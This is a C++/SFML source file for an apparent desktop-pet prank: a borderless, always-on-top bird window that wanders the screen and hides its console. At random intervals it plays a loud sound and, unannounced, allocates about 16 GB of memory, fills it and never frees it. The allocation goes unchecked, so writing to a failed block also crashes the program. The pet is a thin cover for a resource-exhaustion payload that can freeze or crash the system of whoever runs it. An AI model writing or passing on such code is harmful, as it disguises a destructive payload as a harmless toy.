#include <SFML/Graphics.hpp>
#include <SFML/Audio.hpp>
#include <iostream>
#include <Windows.h>
#include <Dwmapi.h>

#pragma comment (lib, "Dwmapi.lib")

int main()
{
    HWND console = GetConsoleWindow();
    ShowWindow(console, SW_HIDE);

    sf::Vector2f window_size = { 200, 100 };

    sf::RenderWindow window(sf::VideoMode((sf::Vector2u)window_size), "BIRD!", sf::Style::None);
    window.setFramerateLimit(60);    


    const HWND hwnd = window.getNativeHandle();

    SetWindowLong(
        hwnd,
        GWL_STYLE,
        WS_POPUP | WS_VISIBLE
    );


    MARGINS margins;
    margins.cxLeftWidth = -1;
    DwmExtendFrameIntoClientArea(hwnd, &margins);

    SetWindowPos(
        hwnd,
        HWND_TOPMOST,
        0, 0, 0, 0,
        SWP_NOMOVE | SWP_NOSIZE
    );

    sf::Vector2i grabbed_offset;
    bool grabbed_window = false;

    sf::Vector2u desktop_size = sf::VideoMode::getDesktopMode().size;

    sf::Texture bird_texture;
    bird_texture.loadFromFile("Assets/bird.png");

    sf::Sprite bird(bird_texture);
    sf::Angle rotation;

    sf::Vector2f bird_scale = sf::Vector2f{ 
        window_size.x / bird_texture.getSize().x,
        window_size.y / bird_texture.getSize().y
    };

    sf::SoundBuffer DAMN_soundbuffer;
    DAMN_soundbuffer.loadFromFile("Assets/DAMN!.wav");
    sf::Sound DAMN_sound(DAMN_soundbuffer);
    DAMN_sound.setVolume(256);

    bird.setScale(bird_scale);
    bird.setOrigin(sf::Vector2f(bird_texture.getSize()) / 2.f);
    bird.setPosition(window_size / 2.f);


    sf::Clock event_clock, delta_clock;
    sf::Time delta_time;

    sf::Vector2f window_position = sf::Vector2f(window.getPosition());

    float timer = 0.f;
    float timer_offset = 0;
    int move_direction = 1.f;

    bool its_DAMN_time = false;

    sf::Angle window_direction_angle;

    std::vector<size_t*> mem;
   
    srand(time(0));

    while (window.isOpen())
    {
        event_clock.restart();
        while (const std::optional event = window.pollEvent())
        {
            if (event->is<sf::Event::MouseButtonPressed>())
            {
                if (event->getIf<sf::Event::MouseButtonPressed>()->button == sf::Mouse::Button::Left)
                {
                    grabbed_offset = window.getPosition() - sf::Mouse::getPosition();
                    grabbed_window = true;
                }
            }
            else if (event->is<sf::Event::MouseButtonReleased>())
            {
                if (event->getIf<sf::Event::MouseButtonReleased>()->button == sf::Mouse::Button::Left)
                {
                    grabbed_window = false;
                }
            }
            else if (event->is<sf::Event::MouseMoved>())
            {
                if (grabbed_window)
                {
                    window_position = sf::Vector2f(sf::Mouse::getPosition() + grabbed_offset);
                    window.setPosition(sf::Vector2i(window_position));
                }
            }
        }


        delta_time = delta_clock.restart() - event_clock.restart();


        if (!its_DAMN_time && timer < 1.f + timer_offset)
        { 
            bird.setRotation(sf::degrees(5) * std::sin(timer * 10.f));

            window_position += sf::Vector2f(100.f, 0).rotatedBy(window_direction_angle) * delta_time.asSeconds();
            move_direction = -(window_position - sf::Vector2f(window.getPosition())).x;
            
            if (move_direction != 0)
            {
                move_direction = std::abs(move_direction) / move_direction;

                bird.setScale({
                    bird_scale.x * move_direction,
                    bird_scale.y
                });
            }

            if (window_position.x < 0)
                window_position.x = -1;
            else if (window_position.x + window_size.x > desktop_size.x)
                window_position.x = desktop_size.x - window_size.x;

            if (window_position.y < 0)
                window_position.y = -1;
            else if (window_position.y + window_size.y > desktop_size.y)
                window_position.y = desktop_size.y - window_size.y;


            window.setPosition(sf::Vector2i(window_position));
        }
        else
        {
            bird.setRotation(sf::degrees(0));
        }

        if (timer > 3.f + timer_offset)
        {
            window_direction_angle = sf::degrees(rand() % 360);
            timer = 0.f;
            timer_offset = rand() % 5;
            its_DAMN_time = (rand() % 3 == 2);
            if (its_DAMN_time)
            {
                DAMN_sound.play();
                DAMN_sound.setPitch(.6f + (rand() % 10) / 10.f);

                mem.push_back(
                    (size_t*)calloc(2'147'483'647, sizeof(size_t))
                );

                for (size_t j = 0; j < 2'147'483'647; ++j)
                {
                    mem[mem.size() - 1][j] = j;
                }
            }
        }

        timer += delta_time.asSeconds();

        window.clear(sf::Color::Transparent);
        window.draw(bird);
        window.display();

    }
}
